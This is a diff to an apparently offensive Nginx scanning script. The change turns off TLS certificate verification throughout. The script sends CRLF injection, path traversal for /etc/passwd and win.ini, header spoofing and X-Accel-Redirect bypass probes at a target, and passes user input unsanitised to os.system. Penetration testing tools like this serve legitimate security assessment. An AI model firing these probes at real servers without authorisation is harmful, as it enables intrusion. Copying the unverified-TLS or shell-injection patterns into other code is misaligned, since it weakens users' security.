@@ -6,6 +6,10 @@ from packaging import version
 import os
 import requests_raw
 from colorama import Fore
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+session = requests.Session()
+
 
 banner='''
  _   _  _____  _____  _   _ __   ________  _    _  _   _  _____ ______
@@ -31,7 +35,7 @@ url = sys.argv[1]
 existingfolderpathlist = sys.argv[2] 
 
 
-basereq = requests.get(url)
+basereq = session.get(url, verify=False)
 
 nginx_version = "https://github.com/nginx/nginx/releases"
 try:
@@ -39,7 +43,7 @@ try:
 except:
   print(Fore.RED+"No Server header found or invalid Server header. If you are sure that your target uses Nginx, it may happen either you are testing something built with NGINX or that a simple NGINX server has the server_tokens directive set to off. In any case, please use nginx-pwner-no-server-header.py")
   sys.exit()
-nginx_req = requests.get(nginx_version)
+nginx_req = session.get(nginx_version, verify=False)
 html=nginx_req.text
 soup = BeautifulSoup(html,'lxml')
 last_version =(soup.findAll('a', attrs={'href': re.compile("^/nginx/nginx/releases/tag")})[0].get('href')).split("-")[1]
@@ -55,14 +59,14 @@ print(Fore.BLUE+"[?] If the tool reveals the nginx.conf file this is probably be
 print(Fore.WHITE+"\n\n")
 os.system("gobuster dir --url "+url+" -w ./nginx.txt --wildcard --random-agent")
 print("\n")
-uri_crlf_test= requests.get(url+"/%0d%0aDetectify:%20clrf")
+uri_crlf_test= session.get(url+"/%0d%0aDetectify:%20clrf", verify=False)
 if "Detectify" in uri_crlf_test.headers:
     print(Fore.RED+"[-] CRLF injection found via $uri or $document_uri parameter with payload: %0d%0aDetectify:%20crlf as URI. If you found any 401 or 403 status code, try injecting X-Accel-Redirect headers in the response or even X-Sendfile")
 else:
     print(Fore.GREEN+"[+] No CRLF via common misconfiguration found")
 #p = subprocess.Popen('curl -IL -X PURGE -D - "'+url+'"/* | grep HTTP', shell=True, stdout=subprocess.PIPE)
 #output, _ = p.communicate()
-purgemethod=requests.request("PURGE", url+"/*", allow_redirects=True)
+purgemethod=requests.request("PURGE", url+"/*", allow_redirects=True, verify=False)
 #print(purgemethod.text+str(purgemethod.headers)+str(purgemethod.status_code))
 if purgemethod.status_code == 204:
     print(Fore.RED+"[-] Possibly misconfigured PURGE HTTP method (purges the web cache), test this HTTP method manually")
@@ -70,18 +74,18 @@ else:
     print(Fore.GREEN+"[+] No signs of misconfigured PURGE HTTP method")
 
 headers={"Referer": "bar"}
-variable_leakage = requests.get(url+"/foo$http_referer", headers=headers)
+variable_leakage = session.get(url+"/foo$http_referer", headers=headers, verify=False)
 if "foobar" in variable_leakage.text:
     print(Fore.RED+"[-] Variable leakage found in NGINX via Referer header")
     print(Fore.RED+"[-] Test other variables like $realpath_root, $nginx_version")
 else:
     print(Fore.GREEN+"[+] No variable leakage misconfiguration found")
 #merge-slashes set to off
-merge_slashes_req = requests.get(url+"///")
-merge_slashes_etc_passwd_old = requests.get(url+ "///../../../../../etc/passwd")
-merge_slashes_etc_passwd = requests.get(url+ "//////../../../../../../etc/passwd")
-merge_slashes_winini_old = requests.get(url+ "///../../../../../win.ini")
-merge_slashes_winini = requests.get(url+ "//////../../../../../../win.ini")
+merge_slashes_req = session.get(url+"///", verify=False)
+merge_slashes_etc_passwd_old = session.get(url+ "///../../../../../etc/passwd", verify=False)
+merge_slashes_etc_passwd = session.get(url+ "//////../../../../../../etc/passwd", verify=False)
+merge_slashes_winini_old = session.get(url+ "///../../../../../win.ini", verify=False)
+merge_slashes_winini = session.get(url+ "//////../../../../../../win.ini", verify=False)
  
 if basereq.status_code == merge_slashes_req and basereq.text == merge_slashes_req.text:
     print(Fore.RED+"[-] Merge slashes set to off. This is useful in case we find an LFI")
@@ -117,10 +121,10 @@ for i in complete_header_list:
     tenzerozerodict.update({i: "10.0.0.1"})
 counter=0
 
-r_first= requests.get(url+"/") #copy as Python request in Burp if you are testing an authenticated thing/POST request/API
+r_first= session.get(url+"/", verify=False) #copy as Python request in Burp if you are testing an authenticated thing/POST request/API
 for x, y in onetwosevendict.items():
     z = {x:y}
-    r = requests.get(url+"/", headers=z)
+    r = session.get(url+"/", headers=z, verify=False)
     resta = len(r.text) - len(r_first.text)
     if r.status_code != r_first.status_code or resta > 20:
        print("Difference found with headers:")
@@ -131,10 +135,10 @@ if counter == 0:
 
 counter=0
 
-r_first= requests.get(url+"/") #copy as Python request in Burp if you are testing an authenticated thing/POST request/API
+r_first= session.get(url+"/", verify=False) #copy as Python request in Burp if you are testing an authenticated thing/POST request/API
 for x, y in localhostdict.items():
     z = {x:y}
-    r = requests.get(url+"/", headers=z)
+    r = session.get(url+"/", headers=z, verify=False)
     resta = len(r.text) - len(r_first.text)
     if r.status_code != r_first.status_code or resta > 20:
        print("Difference found with headers:")
@@ -145,10 +149,10 @@ if counter == 0:
 
 counter=0
 
-r_first= requests.get(url+"/") #copy as Python request in Burp if you are testing an authenticated thing/POST request/API
+r_first= session.get(url+"/", verify=False) #copy as Python request in Burp if you are testing an authenticated thing/POST request/API
 for x, y in oneninetwodict.items():
     z = {x:y}
-    r = requests.get(url+"/", headers=z)
+    r = session.get(url+"/", headers=z, verify=False)
     resta = len(r.text) - len(r_first.text)
     if r.status_code != r_first.status_code or resta > 20:
        print("Difference found with headers:")
@@ -159,10 +163,10 @@ if counter == 0:
 
 counter=0
 
-r_first= requests.get(url+"/") #copy as Python request in Burp if you are testing an authenticated thing/POST request/API
+r_first= session.get(url+"/", verify=False) #copy as Python request in Burp if you are testing an authenticated thing/POST request/API
 for x, y in tenzerozerodict.items():
     z = {x:y}
-    r = requests.get(url+"/", headers=z)
+    r = session.get(url+"/", headers=z, verify=False)
     resta = len(r.text) - len(r_first.text)
     if r.status_code != r_first.status_code or resta > 20:
        print("Difference found with headers:")
@@ -179,7 +183,7 @@ Connection: close
 '''
 print(Fore.WHITE+a)
 
-phpindexreq = requests.get(url+"/index.php", allow_redirects=True)
+phpindexreq = session.get(url+"/index.php", allow_redirects=True, verify=False)
 if phpindexreq.status_code == 200:
      print(Fore.GREEN+"[+] The site uses PHP")
 elif "PHPSESSID" in basereq.cookies:
@@ -197,18 +201,18 @@ print(Fore.BLUE+"[?] Executing Kyubi to check for path traversal vulnerabilities
 pathlist = open(existingfolderpathlist, "r")
 pathlines = pathlist.readlines()
 for pathline in pathlines:
-    os.system("kyubi "+url+"/"+pathline.strip())
+    os.system("/usr/local/bin/kyubi "+url+"/"+pathline.strip())
 pathlist.close()
 
 pathlist2 = open(existingfolderpathlist, "r")
 pathlines = pathlist2.readlines()
 counterunauthorised=0
 for pathline in pathlines:
-    makereq = requests.get(url+"/"+pathline.strip())
+    makereq = session.get(url+"/"+pathline.strip(), verify=False)
     if makereq.status_code == 401 or makereq.status_code == 403:
         counterunauthorised +=1
         accel = {"X-Accel-Redirect" : "/"+pathline.strip()}
-        accelreq = requests.get(url+"/randompath",headers=accel)
+        accelreq = session.get(url+"/randompath",headers=accel, verify=False)
         if accelreq.status_code != makereq.status_code:
             print(Fore.RED+"[-] Different status code when accessing "+pathline.strip()+" using a randompath in the URI, but the this path in the X-Accel-Redirect header")
         else:
@@ -221,14 +225,14 @@ pathlist3 = open(existingfolderpathlist, "r")
 pathlines = pathlist3.readlines()
 print(Fore.CYAN+"\n[?] Testing all provided paths to check to CRLF injection. This is specially interesting if the site uses S3 buckets or GCP to host files")
 for pathline in pathlines:
-    uri_crlf_test= requests.get(url+"/"+pathline.strip()+"%0d%0aDetectify:%20clrf")
+    uri_crlf_test= session.get(url+"/"+pathline.strip()+"%0d%0aDetectify:%20clrf", verify=False)
 if "Detectify" in uri_crlf_test.headers:
     print(Fore.RED+"[-] CRLF injection found via in URL:"+url+"/"+pathline.strip()+" payload: %0d%0aDetectify:%20crlf in URI. If you found any 401 or 403 status code, try injecting X-Accel-Redirect headers in the response or even X-Sendfile")
 
 print(Fore.CYAN+"\n[?] Testing for common integer overflow vulnerability in nginx's range filter module")
 
 def send_http_request(url, headers={}, timeout=8.0):
-    httpResponse   = requests.get(url, headers=headers, timeout=timeout)
+    httpResponse   = session.get(url, headers=headers, timeout=timeout, verify=False)
     httpHeaders    = httpResponse.headers
 
     print("status: %s: Server: %s", httpResponse.status_code, httpHeaders.get('Server', ''))
